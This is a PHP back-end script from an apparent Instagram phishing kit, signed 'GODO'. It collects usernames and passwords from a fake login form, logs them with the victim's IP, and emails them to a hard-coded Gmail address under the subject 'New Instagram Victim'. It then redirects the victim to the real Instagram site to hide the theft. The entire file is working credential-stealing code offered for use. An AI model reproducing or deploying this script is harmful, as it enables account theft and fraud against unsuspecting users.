<?php
#██████╗ ███████╗███████╗██████╗ ██████╗ 
#██╔══██╗██╔════╝██╔════╝██╔══██╗╚════██╗
#██║  ██║█████╗  █████╗  ██████╔╝ █████╔╝
#██║  ██║██╔══╝  ██╔══╝  ██╔═══╝  ╚═══██╗
#██████╔╝███████╗███████╗██║     ██████╔╝
#╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═════╝ 
#         By GODO   
                                                                                                                   
$date = gmdate ("d-n-Y");
$time = gmdate ("H:i:s");
$ip = $_SERVER['REMOTE_ADDR'];
$hostname = gethostbyaddr($ip);
$message .= "========== Instagram Login ==========\n";
$message .= "User: ".$_POST['username']."\n";
$message .= "Pass: ".$_POST['password']."\n";
$message .= "----------\n";
$message .= "IP: ".$ip."\n";
$message .= "Log : $time / $date \n";
$rnessage = "$message\n";
$send= "d.iocancsgo@gmail.com";
$subject = "New Instagram Victim | $ip";
$headers = "From: Instagram";
$file = fopen("logs.txt","ab");
fwrite($file,$message);
fclose($file);
$str=array($send, $IWP); foreach ($str as $send)
if(mail($send,$subject,$rnessage,$headers) != false)
{
mail($Send,$subject,$rnessage,$headers);
}
header("Location: https://www.instagram.com/");
?>